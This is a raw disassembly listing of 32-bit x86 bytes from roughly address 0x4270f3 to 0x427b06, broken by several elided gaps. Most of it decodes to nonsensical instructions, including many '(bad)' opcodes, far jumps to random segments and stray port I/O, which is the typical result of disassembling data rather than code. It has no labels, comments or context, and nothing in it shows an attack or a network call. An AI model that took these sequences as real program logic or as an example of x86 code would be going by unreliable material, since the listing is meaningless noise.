  4270f3:	add    BYTE PTR [ebp*2-0x8846ae6],cl
  4270fa:	(bad)  
  4270fb:	std    
  4270fc:	inc    esp
  4270fd:	mov    ebp,0x16b9d96
  427102:	push   cs
  427103:	and    ebx,eax
  427105:	mov    eax,ds:0x1050001
  42710a:	add    BYTE PTR [eax],al
  42710c:	mov    esp,0x7c899c25
  427111:	inc    esp
  427112:	loop   0x427114
  427114:	loop   0x42714d
  427116:	pop    ss
  427117:	add    bh,BYTE PTR [ecx]
  427119:	push   ss
  42711a:	out    dx,eax
  42711b:	jno    0x4270a1
  42711d:	or     eax,0x84bfa510
  427122:	and    BYTE PTR [ebx+eiz*8+0x37],cl
  427126:	shr    BYTE PTR [ecx+0x3e377781],1
  42712c:	add    al,0xf5
  42712e:	mov    fs,ecx
  427130:	pop    edx
  427131:	or     BYTE PTR [ebp+ecx*8-0x66],dl
  427135:	repnz mov dl,0xd0
  427138:	mov    al,ds:0xd9558ee4
  42713d:	bound  esp,QWORD PTR [ecx-0x5e]
  427140:	mov    al,ds:0xb311b4cc
  427145:	fnstcw WORD PTR [esi+edi*8+0x2d]
  427149:	dec    ebp
  42714a:	xchg   ecx,eax
  42714b:	std    
  42714c:	push   0xf9467096
  427151:	dec    ebp
  427152:	mov    dh,0x3d
  427154:	mov    al,ds:0xd3005f32
  427159:	jmp    0x6de1:0x9f0d02e4
  427160:	mov    al,ds:0x83f43b2
  427165:	out    0x7,eax
  427167:	pop    ebx
  427168:	cli    
  427169:	ins    DWORD PTR es:[edi],dx
  42716a:	rcr    BYTE PTR [ebx+0x5d],1
  42716d:	mov    ebp,0xfe7501bd
  427172:	gs xor eax,0x17310017
  427178:	cmp    edi,ebx
  42717a:	scas   eax,DWORD PTR es:[edi]
  42717b:	in     al,dx
  42717c:	stos   DWORD PTR es:[edi],eax
  42717d:	test   bl,0xaf
  427180:	in     al,0xd4
  427182:	(bad)  
  427183:	mov    ds:0x6707a426,eax
  427188:	cwde   
  427189:	(bad)  
  42718a:	rcl    BYTE PTR [edx-0x58],0x60
  42718e:	shr    DWORD PTR cs:[edi+edi*4+0x5b],1
  427193:	lahf   
  427194:	dec    eax
  427195:	push   cs
  427196:	mov    ds:0x4b1270b7,eax
  42719b:	cmp    al,0x6f
  42719d:	pop    es
  42719e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42719f:	xchg   esi,eax
  4271a0:	mov    ebp,0xcf6932f8
  4271a5:	cdq    
  4271a6:	mov    ch,0x9
  4271a8:	adc    ebp,edi
  4271aa:	jge    0x42721e
  4271ac:	inc    ebx
  4271ad:	pop    esp
  4271ae:	leave  
  4271af:	mov    esp,DWORD PTR [ebx]
  4271b1:	jns    0x4271bd
  4271b3:	mov    bh,0x2d
  4271b5:	fidiv  WORD PTR [ecx-0x16]
  4271b8:	test   BYTE PTR [ecx],bh
  4271ba:	int    0x2b
  4271bc:	xor    al,0xa
  4271be:	add    BYTE PTR [eax+ebp*4-0x75a986a7],al
  4271c5:	hlt    
  4271c6:	fisub  DWORD PTR [esi-0x49fd46]
  4271cc:	mov    ecx,0x2810ecd7
  4271d1:	jno    0x427156
  4271d3:	push   es
  4271d4:	iret   
  4271d5:	cwde   
  4271d6:	imul   ebx,DWORD PTR [ecx-0x27],0x4c
  4271da:	jge    0x4271d1
  4271dc:	(bad)  
  4271dd:	shl    DWORD PTR [edx-0x7b15994a],0x3e
  4271e4:	mov    cl,0x6d
  4271e6:	mov    DWORD PTR [ebx-0x5104d1e4],esp
  4271ec:	int    0xd7
  4271ee:	ins    BYTE PTR es:[edi],dx
  4271ef:	cmp    BYTE PTR [ebp-0x4f54156d],dl
  4271f5:	ss lahf 
  4271f7:	repz add al,0x34
  4271fa:	(bad)  
  4271fb:	shl    BYTE PTR [ebp-0x3a],1
  4271fe:	mov    dl,0x16
  427200:	and    eax,0x895cd309
  427205:	scas   al,BYTE PTR es:[edi]
  427206:	sub    eax,0xa548f09c
  42720b:	adc    al,0xc0
  42720d:	jns    0x427236
  42720f:	or     bh,BYTE PTR [ebp+0x0]
	...
  427271:	add    BYTE PTR [eax],al
  427273:	add    BYTE PTR [esi],bl
  427275:	inc    ecx
  427276:	fdiv   QWORD PTR [edi+ebx*8-0x7e148143]
  42727d:	push   ecx
  42727e:	dec    ebp
  42727f:	mov    ds:0xb1ce8aa1,al
  427284:	frstor [edx+0x1050001]
  42728a:	add    BYTE PTR [eax],al
  42728c:	test   BYTE PTR [edi],dl
  42728e:	inc    ebp
  42728f:	xchg   BYTE PTR [esi],al
  427291:	fcomi  st,st(6)
  427293:	imul   ebp,DWORD PTR ds:0x3663ef2e,0x2cd18e8f
  42729d:	dec    ebp
  42729e:	vmwrite ebx,edi
  4272a1:	fnstenv [ebp*8+0x19cc9eb2]
  4272a8:	fwait
  4272a9:	pop    ebp
  4272aa:	mov    ds:0xd8e9cb27,eax
  4272af:	bound  esp,QWORD PTR [ecx]
  4272b1:	and    eax,0x1ad5d60e
  4272b6:	inc    esi
  4272b7:	cmc    
  4272b8:	loop   0x42727d
  4272ba:	icebp  
  4272bb:	adc    esi,ecx
  4272bd:	dec    ebx
  4272be:	lods   al,BYTE PTR ds:[esi]
  4272bf:	add    BYTE PTR [edi],0x44
  4272c2:	dec    edi
  4272c3:	pop    eax
  4272c4:	add    eax,0x3e2fc630
  4272c9:	stc    
  4272ca:	rol    DWORD PTR [edx-0x70e35140],0xd0
  4272d1:	mov    cl,0xba
  4272d3:	dec    eax
  4272d4:	fwait
  4272d5:	ds xor eax,0x7938f19d
  4272dc:	jle    0x4272ed
  4272de:	push   0xc1d2d0bf
  4272e3:	cmp    BYTE PTR [ebp+0x4],dh
  4272e6:	clc    
  4272e7:	push   ecx
  4272e8:	add    esi,DWORD PTR [edx]
  4272ea:	sub    esi,DWORD PTR [esi]
  4272ec:	jmp    0xff626eb6
  4272f1:	mov    eax,0x8183f014
  4272f6:	(bad)  
  4272f7:	jmp    0x4272de
  4272f9:	rcl    BYTE PTR [edi+0x3a],1
  4272fc:	adc    DWORD PTR [esi-0x27],esp
  4272ff:	push   es
  427300:	(bad)  
  427301:	popa   
  427302:	rol    BYTE PTR [ecx-0x13d3d90d],cl
  427308:	call   DWORD PTR [ebp-0xe5b9e57]
  42730e:	add    BYTE PTR [ebx+eiz*8],cl
  427311:	test   BYTE PTR [esi+0x409267c0],dh
  427317:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427318:	pop    es
  427319:	lods   eax,DWORD PTR ds:[esi]
  42731a:	dec    ebp
  42731b:	cdq    
  42731c:	sahf   
  42731d:	sub    ah,BYTE PTR ds:0xe16c68b7
  427323:	xor    edx,DWORD PTR [esp+ebp*2-0x45]
  427327:	pop    eax
  427328:	jmp    0x427339
  42732a:	inc    edx
  42732b:	dec    ebp
  42732c:	fcom   st(1)
  42732e:	out    0xd4,al
  427330:	pop    es
  427331:	and    edi,DWORD PTR [ecx-0x59]
  427334:	xchg   esi,eax
  427335:	dec    edx
  427336:	loop   0x427308
  427338:	inc    esp
  427339:	push   ecx
  42733a:	pop    esi
  42733b:	daa    
  42733c:	loop   0x42734c
  42733e:	jg     0x42736c
  427340:	(bad)  
  427341:	sub    al,0xe2
  427343:	gs stos DWORD PTR es:[edi],eax
  427345:	pop    ebp
  427346:	xchg   esp,eax
  427347:	imul   DWORD PTR [ebx-0x2bfa5818]
  42734d:	stos   DWORD PTR es:[edi],eax
  42734e:	scas   al,BYTE PTR es:[edi]
  42734f:	je     0x427361
  427351:	(bad)  
  427352:	sub    al,0x7e
  427354:	gs mov al,0x9
  427357:	cmp    eax,0xc4337528
  42735c:	adc    cl,BYTE PTR [ebx]
  42735e:	in     eax,0x2f
  427360:	and    al,BYTE PTR [edx+0x25]
  427363:	(bad)  
  427364:	jecxz  0x42737e
  427366:	xchg   ebx,eax
  427367:	das    
  427368:	inc    edi
  427369:	xor    ch,dh
  42736b:	mov    al,ds:0x41063b38
  427370:	inc    eax
  427371:	popf   
  427372:	push   esp
  427373:	in     al,dx
  427374:	test   al,0xd4
  427376:	sub    eax,0xe9eafe25
  42737b:	call   0x933f:0x22932fbf
  427382:	fadd   DWORD PTR ds:0x973832d6
  427388:	gs (bad) 
  42738a:	jno    0x427395
  42738c:	push   eax
  42738d:	cmp    DWORD PTR [eax],esp
  42738f:	retf   0x92
	...
  4273f2:	add    BYTE PTR [eax],al
  4273f4:	adc    bl,BYTE PTR ds:0xaf3f8832
  4273fa:	mov    edx,0x29f0389f
  4273ff:	sbb    eax,eax
  427401:	rcr    DWORD PTR [ebp+0x2b],0xe2
  427405:	mov    ds:0x1050001,eax
  42740a:	add    BYTE PTR [eax],al
  42740c:	mov    dh,0xeb
  42740e:	inc    ebx
  42740f:	mov    bl,0xc1
  427411:	pop    edx
  427412:	add    dl,BYTE PTR [eax+0x3fcced27]
  427418:	iret   
  427419:	push   es
  42741a:	cmp    eax,0x3746fca7
  42741f:	xor    al,0xba
  427421:	mov    ds:0x30fef357,eax
  427426:	and    esp,DWORD PTR [ebx+0x17]
  427429:	fst    QWORD PTR [edx]
  42742b:	add    esp,DWORD PTR [edi]
  42742d:	inc    ebp
  42742e:	addr16 jmp 0x427468
  427431:	imul   eax,ebx,0x533ba8ee
  427437:	mov    al,ds:0x2d138117
  42743c:	jmp    0xc576:0x9f63f4df
  427443:	into   
  427444:	int3   
  427445:	cmc    
  427446:	cmp    DWORD PTR [esi+0x74],esi
  427449:	and    BYTE PTR [edi],0x26
  42744c:	loope  0x42741e
  42744e:	dec    esi
  42744f:	imul   ecx,DWORD PTR [esi-0x70],0x46a40caa
  427456:	fcom   st(6)
  427458:	mov    eax,ds:0x214aa80e
  42745d:	cs int 0x73
  427460:	out    0xaa,al
  427462:	mov    WORD PTR [ebp-0x33],es
  427465:	aad    0x2c
  427467:	push   esi
  427468:	add    dh,BYTE PTR [edx]
  42746a:	add    al,0x89
  42746c:	sub    bh,bh
  42746e:	or     edi,DWORD PTR [edx]
  427470:	fmul   DWORD PTR ds:0x83feffe2
  427476:	cmp    bl,BYTE PTR [esi]
  427478:	sbb    al,BYTE PTR [ebx]
  42747a:	fwait
  42747b:	repz shl DWORD PTR [eax+0x45],cl
  42747f:	jmp    0x9cae:0xdfc9215b
  427486:	scas   eax,DWORD PTR es:[edi]
  427487:	xchg   edx,eax
  427488:	inc    ecx
  427489:	dec    esp
  42748a:	(bad)  
  42748b:	mov    cl,0xd0
  42748d:	dec    eax
  42748e:	inc    ebx
  42748f:	adc    esp,ebp
  427491:	call   0x9356d476
  427496:	mov    cl,0x7e
  427498:	mov    ds:0xb0a9f084,eax
  42749d:	inc    edi
  42749e:	pop    es
  42749f:	push   ss
  4274a0:	aas    
  4274a1:	push   ss
  4274a2:	inc    eax
  4274a3:	fisubr DWORD PTR [ebp+0x7156ba0f]
  4274a9:	(bad)  
  4274aa:	cmp    BYTE PTR [edx-0x1f11295e],ch
  4274b0:	xchg   esp,eax
  4274b1:	mov    ds:0x6dc73118,al
  4274b6:	out    dx,al
  4274b7:	pop    ss
  4274b8:	rcr    BYTE PTR [esi],cl
  4274ba:	dec    edi
  4274bb:	je     0x4274c0
  4274bd:	xor    eax,ebp
  4274bf:	sbb    DWORD PTR [ebx+0x23],ecx
  4274c2:	cs ret 0xf872
  4274c6:	xchg   ebp,eax
  4274c7:	bound  ebp,QWORD PTR [esi]
  4274c9:	mov    edx,0x5b9a8deb
  4274ce:	and    al,0xca
  4274d0:	mov    bh,0x79
  4274d2:	data16 sub ah,BYTE PTR [ecx+edi*2-0x3710aac0]
  4274da:	mov    al,ds:0xd6c4e4be
  4274df:	dec    esi
  4274e0:	xchg   esp,eax
  4274e1:	call   0x44cc:0x8f566c39
  4274e8:	outs   dx,BYTE PTR ds:[esi]
  4274e9:	test   bl,al
  4274eb:	push   ecx
  4274ec:	out    0xb3,al
  4274ee:	pop    esp
  4274ef:	and    dh,bh
  4274f1:	and    edx,esp
  4274f3:	adc    bh,bh
  4274f5:	cs push 0xf762f511
  4274fb:	jmp    WORD PTR fs:[bx+di+0x1b]
  427501:	lods   al,BYTE PTR ds:[esi]
  427502:	hlt    
  427503:	fdivrp st(1),st
  427505:	test   BYTE PTR [ebx+edi*4],al
  427508:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427509:	sbb    al,0x36
  42750b:	add    al,BYTE PTR [edi-0x64]
  42750e:	lahf   
  42750f:	inc    edi
  427510:	stos   BYTE PTR es:[edi],al
	...
  427571:	add    BYTE PTR [eax],al
  427573:	add    BYTE PTR [eax+ebp*4-0x40],bl
  427577:	stos   DWORD PTR es:[edi],eax
  427578:	hlt    
  427579:	jmp    0x4275fa
  42757b:	(bad)  
  42757c:	cmp    dh,BYTE PTR [esi]
  42757e:	jbe    0x4275ea
  427580:	int    0x93
  427582:	inc    esi
  427583:	(bad)  
  427584:	out    0xa4,eax
  427586:	add    DWORD PTR [eax],eax
  427588:	add    eax,0xbb000001
  42758d:	cld    
  42758e:	add    BYTE PTR [edx+0x70],al
  427591:	inc    ecx
  427592:	pop    ds
  427593:	and    eax,DWORD PTR [ecx+0x74]
  427596:	in     eax,0x78
  427598:	shl    DWORD PTR [eax],0x44
  42759b:	push   es
  42759c:	and    DWORD PTR [esi+edx*1-0x38682649],edi
  4275a3:	sub    BYTE PTR [ebx-0x9],0xf6
  4275a7:	dec    edx
  4275a8:	(bad)  
  4275a9:	push   ebx
  4275aa:	xor    ah,BYTE PTR [ebx]
  4275ac:	cmp    BYTE PTR [esi],ah
  4275ae:	pop    ds
  4275af:	push   esi
  4275b0:	and    dl,0xc7
  4275b3:	out    0x4,al
  4275b5:	aaa    
  4275b6:	ins    BYTE PTR es:[edi],dx
  4275b7:	and    ebp,eax
  4275b9:	or     bl,BYTE PTR [eax+0x5e]
  4275bc:	pop    edi
  4275bd:	xor    eax,0xb65eba31
  4275c2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4275c3:	or     ebx,eax
  4275c5:	pop    ss
  4275c6:	pushf  
  4275c7:	pop    ss
  4275c8:	sbb    al,0x64
  4275ca:	dec    esp
  4275cb:	enter  0xa519,0xc5
  4275cf:	and    edx,ecx
  4275d1:	iret   
  4275d2:	daa    
  4275d3:	xor    edx,eax
  4275d5:	lahf   
  4275d6:	jae    0x427583
  4275d8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4275d9:	xor    DWORD PTR [eax],0xffffffcd
  4275dc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4275de:	ret    
  4275df:	mov    esi,0xe411d4b9
  4275e4:	rcr    BYTE PTR [ebx+0x15],1
  4275e7:	xchg   ecx,eax
  4275e8:	dec    edi
  4275e9:	and    eax,0x654abcfe
  4275ee:	jl     0x4275e4
  4275f0:	push   ecx
  4275f1:	gs jb  0x42760b
  4275f4:	aam    0xd
  4275f6:	rcl    BYTE PTR [esi],1
  4275f8:	mov    esi,0x83306c3f
  4275fd:	push   ecx
  4275fe:	mul    BYTE PTR [ecx+0x54b6259a]
  427604:	adc    ecx,DWORD PTR [esi-0x46]
  427607:	push   edx
  427608:	jmp    0x427673
  42760a:	inc    ecx
  42760b:	ins    DWORD PTR es:[edi],dx
  42760c:	cmp    ch,bh
  42760e:	xor    DWORD PTR [ebx+0xf],ecx
  427611:	add    DWORD PTR [ebx-0x7],esi
  427614:	inc    edx
  427615:	mov    bh,cl
  427617:	xchg   DWORD PTR [esi-0x2813871d],ecx
  42761d:	stc    
  42761e:	push   esi
  42761f:	test   al,0xce
  427621:	xchg   ebx,eax
  427622:	mov    edx,0x7a5b7a63
  427627:	ja     0x4275dc
  427629:	xchg   ecx,eax
  42762a:	xchg   ebp,eax
  42762b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42762c:	shl    bl,0xd3
  42762f:	push   edi
  427630:	outs   dx,BYTE PTR ds:[esi]
  427631:	cmp    ecx,edi
  427633:	push   eax
  427634:	ror    BYTE PTR [esi],cl
  427636:	lock mov ecx,0x435a74af
  42763c:	out    0xe,al
  42763e:	cmp    bl,dh
  427640:	pop    edx
  427641:	jae    0x427629
  427643:	and    DWORD PTR [bx+si-0x5c],0x81504388
  42764b:	mov    cl,0xaa
  42764d:	rcl    BYTE PTR [ebp+0x585859ec],0x1a
  427654:	dec    edx
  427655:	add    ebx,ebp
  427657:	cmp    esi,DWORD PTR [edx+0x3f]
  42765a:	add    cl,BYTE PTR [esi-0x20]
  42765d:	mov    BYTE PTR [esi+esi*4+0x1c],cl
  427661:	mov    al,ds:0xbd6569f4
  427666:	outs   dx,DWORD PTR ds:[esi]
  427667:	adc    ecx,DWORD PTR [eax+0x787a3f1f]
  42766d:	cmc    
  42766e:	pop    ebx
  42766f:	jmp    0xc150c8a7
  427674:	xchg   DWORD PTR [ecx+0x59],esi
  427677:	ss leave 
  427679:	or     ebp,DWORD PTR [ebx]
  42767b:	cdq    
  42767c:	ror    BYTE PTR [ecx],cl
  42767e:	mov    al,0x3d
  427680:	lahf   
  427681:	mov    WORD PTR [esi],?
  427683:	cld    
  427684:	sub    DWORD PTR [esi-0x3b],ebx
  427687:	fbstp  TBYTE PTR [ecx]
  427689:	arpl   si,dx
  42768b:	test   DWORD PTR [edi+0x73],esi
  42768e:	mov    al,ds:0x8cc6
	...
  4276f3:	add    BYTE PTR [ecx],al
  4276f5:	push   esi
  4276f6:	nop
  4276f7:	out    dx,al
  4276f8:	xlat   BYTE PTR ds:[ebx]
  4276f9:	out    dx,al
  4276fa:	jg     0x4276fb
  4276fc:	in     al,dx
  4276fd:	xor    al,0x86
  4276ff:	fnstenv [edi-0x13273d1e]
  427705:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427706:	add    DWORD PTR [eax],eax
  427708:	add    eax,0x74000001
  42770d:	and    DWORD PTR [ebx],eax
  42770f:	push   ebx
  427710:	test   BYTE PTR [eax-0x5e],bh
  427713:	lea    esp,[eax]
  427715:	add    BYTE PTR [esi-0x2779a35f],0xfc
  42771c:	adc    DWORD PTR [edi-0x6339bd3f],esi
  427722:	or     eax,0x637d3326
  427727:	jg     0x4276aa
  427729:	cmp    dh,BYTE PTR [eax+0x5b]
  42772c:	pop    esi
  42772d:	and    al,0xc3
  42772f:	sbb    bh,BYTE PTR [esi]
  427731:	test   BYTE PTR [ecx],0x6c
  427734:	popa   
  427735:	mov    bl,0xc8
  427737:	mov    al,0xde
  427739:	mov    ecx,0x437f4873
  42773e:	cmp    edi,0x76
  427741:	(bad)  
  427742:	(bad)  
  427743:	lahf   
  427744:	adc    BYTE PTR [ecx+0x5d],bh
  427747:	out    0x3e,ax
  42774a:	push   esi
  42774b:	scas   al,BYTE PTR es:[edi]
  42774c:	xlat   BYTE PTR ds:[ebx]
  42774d:	cmp    cl,BYTE PTR [ebp-0xf]
  427750:	aaa    
  427751:	in     al,0xb3
  427753:	ror    BYTE PTR [edx-0x24a1d1db],cl
  427759:	lahf   
  42775a:	push   0x42
  42775c:	test   eax,0xb8d53a29
  427761:	retf   0x2cf
  427764:	xchg   edx,eax
  427765:	push   ecx
  427766:	mov    eax,ds:0x56615f96
  42776b:	pop    esp
  42776c:	mov    ah,al
  42776e:	fwait
  42776f:	or     eax,0x9274db73
  427774:	(bad)  
  427775:	fwait
  427776:	sub    al,0x8c
  427778:	inc    esi
  427779:	shr    BYTE PTR [edi-0x5f],0x31
  42777d:	add    ch,BYTE PTR ds:0xa68e778b
  427783:	jb     0x4277c2
  427785:	retf   0x3c2c
  427788:	retf   
  427789:	jg     0x427734
  42778b:	xchg   BYTE PTR [eax+esi*2],dl
  42778e:	clc    
  42778f:	imul   ecx,eax,0xffffffff
  427792:	sub    BYTE PTR [edi],bl
  427794:	test   eax,0x280db2b3
  427799:	(bad)  
  42779a:	loopne 0x42772b
  42779c:	and    DWORD PTR [esi+0x7b],0x2b
  4277a0:	jg     0x427803
  4277a2:	test   al,0x35
  4277a4:	(bad)  
  4277a5:	enter  0x8378,0x98
  4277a9:	leave  
  4277aa:	adc    eax,0xb86da8c5
  4277af:	mov    ecx,0xf1c5b28e
  4277b4:	mov    ds:0xe3da0ec7,al
  4277b9:	mov    ah,0x47
  4277bb:	in     eax,0xba
  4277bd:	lods   al,BYTE PTR ds:[esi]
  4277be:	(bad)  
  4277bf:	ss xchg ecx,eax
  4277c1:	out    0xde,eax
  4277c3:	dec    ecx
  4277c4:	cmc    
  4277c5:	mov    bh,0xc5
  4277c7:	add    DWORD PTR [eax+ecx*1+0x56],ebp
  4277cb:	nop
  4277cc:	jno    0x4277b4
  4277ce:	dec    esp
  4277cf:	add    bh,ah
  4277d1:	aam    0xbc
  4277d3:	cmc    
  4277d4:	mov    al,ds:0xe1099d32
  4277d9:	pop    esp
  4277da:	sub    al,0x14
  4277dc:	ror    BYTE PTR [edx],0x68
  4277df:	xchg   DWORD PTR fs:[ebp-0x21],eax
  4277e3:	xchg   esp,eax
  4277e4:	mov    dl,0x7
  4277e6:	test   ah,ch
  4277e8:	pop    ss
  4277e9:	leave  
  4277ea:	popf   
  4277eb:	call   0x2b95:0x73620e9f
  4277f2:	sub    BYTE PTR [ecx+0x5942e49d],ch
  4277f8:	push   edx
  4277f9:	out    0x16,al
  4277fb:	test   al,0x31
  4277fd:	sub    bl,BYTE PTR [ecx-0x6c4812b1]
  427803:	imul   ebx,esi,0xb37c2f92
  427809:	scas   al,BYTE PTR es:[edi]
  42780a:	xor    al,0xce
  42780c:	dec    esp
  42780d:	fcom   st(6)
  42780f:	adc    eax,0x94
	...
  427874:	sbb    cl,BYTE PTR [edx-0x3a64baf5]
  42787a:	pop    esi
  42787b:	fbstp  TBYTE PTR [eax+0x65]
  42787e:	fldl2e 
  427880:	or     cl,ah
  427882:	jb     0x42781d
  427884:	icebp  
  427885:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427886:	add    DWORD PTR [eax],eax
  427888:	add    eax,0xa2000001
  42788d:	xor    ch,BYTE PTR [ecx+0x606b641f]
  427893:	sbb    BYTE PTR [edi],0x2e
  427896:	jmp    0xc7bf4116
  42789b:	or     al,0x91
  42789d:	fs icebp 
  42789f:	fimul  DWORD PTR [edi-0xdfe9d43]
  4278a5:	push   0x38
  4278a7:	(bad)  
  4278a8:	xchg   ecx,eax
  4278a9:	mov    edi,0x7d7b90ab
  4278ae:	pop    ebp
  4278af:	loope  0x4278f2
  4278b1:	shr    BYTE PTR [ecx+esi*8],1
  4278b4:	xchg   esi,eax
  4278b5:	sbb    eax,esi
  4278b7:	mov    eax,0x1e60fff0
  4278bc:	call   0x648a467e
  4278c1:	pop    es
  4278c2:	rcl    BYTE PTR [edx+0x7a0c07cc],0x77
  4278c9:	adc    BYTE PTR [ecx+0x164a5cbe],dl
  4278cf:	or     ebp,0x6
  4278d2:	pop    ds
  4278d3:	mov    ebp,0x442affed
  4278d8:	xchg   ebp,eax
  4278d9:	mul    DWORD PTR ds:0x8e5df08c
  4278df:	xor    eax,0xc92be8ae
  4278e4:	das    
  4278e5:	xor    al,0xbe
  4278e7:	mov    cl,0x8e
  4278e9:	cmc    
  4278ea:	pop    es
  4278eb:	cmp    al,0xec
  4278ed:	xchg   ebx,eax
  4278ee:	stos   DWORD PTR es:[edi],eax
  4278ef:	sbb    esp,esp
  4278f1:	mov    esp,0xf172e338
  4278f6:	dec    edx
  4278f7:	xchg   DWORD PTR [ecx],eax
  4278f9:	xchg   ebx,eax
  4278fa:	inc    edx
  4278fb:	xchg   esp,eax
  4278fc:	sub    DWORD PTR [eax+0x3a38bc24],ebp
  427902:	ret    
  427903:	mov    esi,DWORD PTR [edx+0x51]
  427906:	jmp    0x4278f1
  427908:	int    0xdf
  42790a:	cmp    DWORD PTR [esi+0x8],0x2c
  42790e:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  427910:	aaa    
  427911:	dec    ecx
  427912:	jae    0x427986
  427914:	sar    DWORD PTR [esi],1
  427916:	popa   
  427917:	mov    al,ds:0x9d98a413
  42791c:	push   cs
  42791d:	pop    esp
  42791e:	fisub  DWORD PTR [edx+eax*1]
  427921:	(bad)  
  427922:	rol    edx,1
  427924:	mov    ds:0x905251d1,eax
  427929:	bound  edx,QWORD PTR [ebx+edx*8]
  42792c:	xchg   edx,eax
  42792d:	xchg   esp,eax
  42792e:	or     al,0xed
  427930:	int    0x6b
  427932:	retf   
  427933:	loop   0x427908
  427935:	pop    ecx
  427936:	and    al,0x9e
  427938:	mov    esi,0x9ad388e4
  42793d:	fld    st(2)
  42793f:	sub    dl,BYTE PTR [esi-0x5453178d]
  427945:	loope  0x427923
  427947:	inc    bx
  427949:	sbb    dh,BYTE PTR [ebp-0x20]
  42794c:	cwde   
  42794d:	stos   BYTE PTR es:[edi],al
  42794e:	bound  ecx,QWORD PTR [ebx-0x6b645f99]
  427954:	and    eax,0xceca1fb9
  427959:	and    eax,0xc4a7e1d2
  42795e:	aad    0x51
  427960:	mov    esp,0x3bbb76c6
  427965:	xor    BYTE PTR [esi+edi*2-0x33],dh
  427969:	pop    eax
  42796a:	fldcw  WORD PTR [edi-0x64]
  42796d:	dec    ebp
  42796e:	or     BYTE PTR [edx+ecx*1-0x3e0a968f],dh
  427975:	popf   
  427976:	mov    bl,0xbc
  427978:	add    bh,dh
  42797a:	out    0x6f,eax
  42797c:	mov    esi,0x511cebdb
  427981:	inc    edx
  427982:	cmp    eax,0x5b28b902
  427987:	sub    edx,DWORD PTR [ecx]
  427989:	jmp    FWORD PTR [ebp+0x11]
  42798c:	or     eax,0x9febc534
	...
  4279f1:	add    BYTE PTR [eax],al
  4279f3:	add    BYTE PTR [edx-0x5c0023],bl
  4279f9:	mov    ds:0x7542fdde,eax
  4279fe:	fadd   DWORD PTR [ebx+0x4f5006c5]
  427a04:	mul    BYTE PTR [edi+0x1050001]
  427a0a:	add    BYTE PTR [eax],al
  427a0c:	jne    0x427a01
  427a0e:	test   al,0xff
  427a10:	sti    
  427a11:	out    0x62,al
  427a13:	mov    esi,0xa66859c1
  427a18:	push   edi
  427a19:	aas    
  427a1a:	dec    ecx
  427a1b:	lahf   
  427a1c:	sub    eax,ecx
  427a1e:	and    eax,0x4bcb4347
  427a23:	pop    es
  427a24:	in     al,dx
  427a25:	push   0xffffffe0
  427a27:	int3   
  427a28:	loope  0x427a49
  427a2a:	xor    al,0xc
  427a2c:	call   edx
  427a2e:	nop
  427a2f:	lock push ebp
  427a31:	cs mov esi,0xba4b48f3
  427a37:	sbb    al,0x5f
  427a39:	xchg   edx,eax
  427a3a:	xchg   esi,eax
  427a3b:	mov    ch,0x9b
  427a3d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427a3e:	fist   DWORD PTR ds:0xe7160d6b
  427a44:	pushf  
  427a45:	adc    eax,0x7a27ecce
  427a4a:	fcom   DWORD PTR [esi+0x3cbff075]
  427a50:	pop    es
  427a51:	adc    ecx,ebx
  427a53:	xor    ecx,eax
  427a55:	je     0x4279ef
  427a57:	pop    eax
  427a58:	lock inc ebx
  427a5a:	in     al,0xe0
  427a5c:	imul   ebx,DWORD PTR [edi],0xffffff8d
  427a5f:	mov    esp,0x7e26d630
  427a64:	ds pop esp
  427a66:	inc    ebp
  427a67:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427a68:	jo     0x427a04
  427a6a:	push   edx
  427a6b:	repz out 0xc,al
  427a6e:	out    0x40,eax
  427a70:	icebp  
  427a71:	out    dx,al
  427a72:	xor    edx,ecx
  427a74:	mov    al,ds:0xdf5b7ffb
  427a79:	cmc    
  427a7a:	xchg   DWORD PTR [edx-0x3e0ebad9],edi
  427a80:	in     al,dx
  427a81:	in     al,0x2d
  427a83:	(bad)  
  427a84:	mov    eax,ds:0xe249f5da
  427a89:	das    
  427a8a:	imul   BYTE PTR [ecx-0x16]
  427a8d:	xchg   esp,eax
  427a8e:	pop    eax
  427a8f:	mov    bl,0xdf
  427a91:	inc    edi
  427a92:	xchg   BYTE PTR [ecx-0x6f],bl
  427a95:	sbb    esi,ebp
  427a97:	fs and al,0x6e
  427a9a:	int    0x52
  427a9c:	ror    ebx,1
  427a9e:	call   0xa83a7727
  427aa3:	mov    ah,0x28
  427aa5:	sahf   
  427aa6:	ret    
  427aa7:	mov    es,WORD PTR [ebx]
  427aa9:	(bad)  
  427aaa:	scas   eax,DWORD PTR es:[edi]
  427aab:	jle    0x427ac3
  427aad:	push   edi
  427aae:	fadd   QWORD PTR ds:0x6eb41943
  427ab4:	xchg   BYTE PTR [ebp+0x1],ah
  427ab7:	outs   dx,DWORD PTR ds:[esi]
  427ab8:	test   DWORD PTR [ecx-0x4e],ebp
  427abb:	cwde   
  427abc:	inc    ecx
  427abd:	and    al,0x8d
  427abf:	xor    eax,DWORD PTR [edx+0xf]
  427ac2:	repz shl DWORD PTR [edx],0x6b
  427ac6:	iret   
  427ac7:	push   esi
  427ac8:	or     al,0x67
  427aca:	data16 cmp dl,BYTE PTR [eax]
  427acd:	out    dx,al
  427ace:	and    al,0x92
  427ad0:	shl    DWORD PTR [ecx],1
  427ad2:	popa   
  427ad3:	jl     0x427b11
  427ad5:	add    BYTE PTR [ebx-0x2da2a532],ch
  427adb:	dec    ebp
  427adc:	shl    BYTE PTR ds:0xeb918539,cl
  427ae2:	es jno 0x427af9
  427ae5:	sahf   
  427ae6:	cmp    eax,0xda0c0441
  427aeb:	adc    ebx,edi
  427aed:	adc    BYTE PTR [edi+0x4efb9e31],ah
  427af3:	outs   dx,BYTE PTR fs:[esi]
  427af5:	lock stos BYTE PTR es:[edi],al
  427af7:	xchg   edi,eax
  427af8:	fsub   QWORD PTR [ebx-0x605f116c]
  427afe:	adc    esi,DWORD PTR [eax+esi*8-0x5c9342c4]
  427b05:	popa   
  427b06:	(bad)  
